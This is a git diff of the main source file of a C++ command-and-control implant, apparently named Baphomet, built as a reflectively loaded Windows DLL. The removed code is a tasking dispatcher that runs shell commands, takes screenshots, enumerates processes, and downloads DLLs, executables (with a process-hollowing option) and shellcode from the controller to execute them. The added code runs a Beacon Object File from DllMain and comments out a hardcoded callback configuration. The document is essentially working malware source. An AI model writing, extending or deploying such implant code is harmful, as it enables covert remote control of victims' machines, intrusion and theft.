@@ -1,10 +1,14 @@
 #include "main.hpp"
+#include "tasking/injection/bof/beacon_api.hpp"
 #pragma comment(lib,"winhttp.lib")
 
-#define BAPHOMET_DEBUG
-#ifdef BAPHOMET_DEBUG
-    #include <iostream>
-#endif
+command_output
+process_command(
+        _In_ const std::string& command_str,
+        _In_ const char delimeter,
+        _In_ const implant_context& ctx
+);
+
 
 //
 // for testing purposes
@@ -47,192 +51,7 @@ bool read_from_disk(const std::string& file_name, std::string& outbuff) {
 }
 
 
-std::string
-format_output(const std::string& str) {
-    return std::string("\"\n") + (str + '\"');
-}
 
-
-command_output
-process_command(
-        _In_ const std::string& command_str,
-        _In_ const char delimeter,
-        _In_ const implant_context& ctx
-    ) {
-
-    std::vector<std::string> args;
-    size_t start            = 0;
-    size_t next_delimeter   = command_str.find(delimeter);
-
-    while(next_delimeter != std::string::npos) {
-        if(next_delimeter > start) {
-            args.push_back(command_str.substr(start, next_delimeter - start));
-        }
-
-        start = next_delimeter + 1;
-        next_delimeter = command_str.find(delimeter, start);
-    }
-
-    if(args.empty()) {
-        return { format_output("Invalid command."), nullptr, output_type::PLAIN_TEXT };
-    }
-
-
-#ifdef BAPHOMET_DEBUG
-    std::cout << "[+] Command chunks:" << std::endl;
-    for(size_t i = 0; i < args.size(); i++) {
-        std::cout << " - " << args[i] << std::endl;
-    }
-#endif
-
-    //
-    // gonna just stick with the simplest way of doing this, no std::map or anything.
-    // takes up more LOC, but less things to statically link, so smaller payload size.
-    // plus, arguably more readable.
-    //
-
-    const std::string cmd_name = args[0];
-
-    if(cmd_name == "pwd") {
-        return { format_output(tasking::pwd()), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if(cmd_name == "cd") {
-        return { format_output(tasking::cd(args[1])), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "ls") {
-        return { format_output(tasking::ls()), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "cat") {
-        return { format_output(tasking::cat(args[1])), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "procenum") {
-        return { format_output(recon::enumerate_processes()), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "whoami") {
-        return { format_output(recon::whoami()), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "rm") {
-        return { format_output(tasking::rm(args[1])), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "mkdir") {
-        return { format_output(tasking::mkdir(args[1])), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "cp") {
-        return { format_output(tasking::cp(args[1], args[2])), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "ps") {
-        return { format_output(tasking::shell_command(args[1], true)), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "cmd") {
-        return { format_output(tasking::shell_command(args[1], false)), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    if (cmd_name == "screenshot") {
-        HANDLE hscreenshot = recon::save_screenshot();
-        if(hscreenshot == nullptr) {
-            return {"Failed to save screenshot.", nullptr, output_type::PLAIN_TEXT };
-        }
-
-        return {"", hscreenshot, output_type::FILE};
-    }
-
-
-    if(cmd_name == "rundll") {
-        obfus::sleep(ctx.sleep_time);
-        std::string dll_file;
-
-        if(!networking::http::recieve_file(
-            ctx.hconnect,
-            ctx.callback_object,
-            args[1],
-            ctx.session_token,
-            ctx.is_https,
-            dll_file
-        )) {
-            return {
-                format_output("Failed to download specified DLL: " + args[1]),
-                nullptr,
-                output_type::PLAIN_TEXT
-            };
-        }
-
-        return {
-            format_output(tasking::rundll(dll_file)),
-            nullptr,
-            output_type::PLAIN_TEXT
-        };
-    }
-
-
-    if(cmd_name == "runexe") {
-        obfus::sleep(ctx.sleep_time);
-        std::string exe_file;
-
-        if(!networking::http::recieve_file(
-            ctx.hconnect,
-            ctx.callback_object,
-            args[1],
-            ctx.session_token,
-            ctx.is_https,
-            exe_file
-        )) {
-            return {
-                format_output("Failed to download specified executable: " + args[1]),
-                nullptr,
-                output_type::PLAIN_TEXT
-            };
-        }
-
-        return {
-            format_output(tasking::runexe(args[2] == "hollow", exe_file)),
-            nullptr,
-            output_type::PLAIN_TEXT
-        };
-    }
-
-
-    if(cmd_name == "runshellcode") {
-        obfus::sleep(ctx.sleep_time);
-        std::string shellcode_buff;
-
-        if(!networking::http::recieve_file(
-            ctx.hconnect,
-            ctx.callback_object,
-            args[1],
-            ctx.session_token,
-            ctx.is_https,
-            shellcode_buff
-        )) {
-            return {
-                format_output("Failed to download shellcode: " + args[1]),
-                nullptr,
-                output_type::PLAIN_TEXT
-            };
-        }
-
-        return {
-            format_output(tasking::run_shellcode(GetCurrentProcessId(), shellcode_buff)),
-            nullptr,
-            output_type::PLAIN_TEXT
-        };
-    }
-
-    if(cmd_name == "runbof") {
-        return { format_output("unimplimented"), nullptr, output_type::PLAIN_TEXT };
-    }
-
-    return { format_output("Unknown command."), nullptr, output_type::PLAIN_TEXT };
-}
 
 
 bool
@@ -275,10 +94,6 @@ recieve_commands(implant_context& ctx) {
             continue;
         }
 
-        if(task == (std::string("die") + COMMAND_DELIMITER) ) {
-            break;
-        }
-
         #ifdef BAPHOMET_DEBUG
             std::cout << "[+] recieved task: " << task << std::endl;
         #endif
@@ -312,6 +127,7 @@ recieve_commands(implant_context& ctx) {
                 ctx.session_token,
                 ctx.is_https
             );
+            CloseHandle(file_to_upload);
         }
 
         #ifdef BAPHOMET_DEBUG
@@ -321,6 +137,10 @@ recieve_commands(implant_context& ctx) {
                 std::cout << "[!] Failed to send response!" << std::endl;
             }
         #endif
+
+        if(task == std::string("die") + COMMAND_DELIMITER) {
+            break;
+        }
     }
 
     #ifdef BAPHOMET_DEBUG
@@ -331,38 +151,51 @@ recieve_commands(implant_context& ctx) {
 }
 
 
+
+//
+// TODO: add CFG valid call targets for sleep obf
+//
+
 BOOL APIENTRY DllMain(
     HMODULE hModule,
     DWORD  ul_reason_for_call,
     LPVOID lpReserved
 ) {
 
-    std::cout << "Made it past reflective setup." << std::endl;
 
+    /*
     implant_context ctx;
     ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
-    ctx.session_token = "UFlxaWk3TWlSWkJQQ2t0SW5Ga2h5VEQ5SQ==";
+    ctx.session_token = "NVJrNTVJdGRHOVBvSmJiaThIeGs4U0tUcQ==";
     ctx.server_addr = "127.0.0.1";
     ctx.port = 8081;
     ctx.is_https = false;
     ctx.user_agent = "test program/1.0";
     ctx.sleep_time = 2500;
     ctx.jitter = 0;
+    */
+
+    std::string bof;
 
     switch (ul_reason_for_call)
     {
         case DLL_PROCESS_ATTACH:
-            std::cout << "we are so attached. starting..." << std::endl;
-            if(!recieve_commands(ctx)) {
-                std::cout << "FAILED!" << std::endl;
+            if(!read_from_disk("whoami.x64.o", bof)) {
                 return FALSE;
             }
+
+            std::cout << "BOF OUTPUT:\n" << tasking::execute_bof(bof, nullptr, 0) << std::endl;
+            std::cout << "[+] BOF execution successful!" << std::endl;
+
             break;
         case DLL_THREAD_ATTACH:
+            printf("[+] thread attach.\n");
             break;
         case DLL_THREAD_DETACH:
+            printf("[+] thread detach.\n");
             break;
         case DLL_PROCESS_DETACH:
+            printf("[+] process detach.\n");
             break;
     }
 
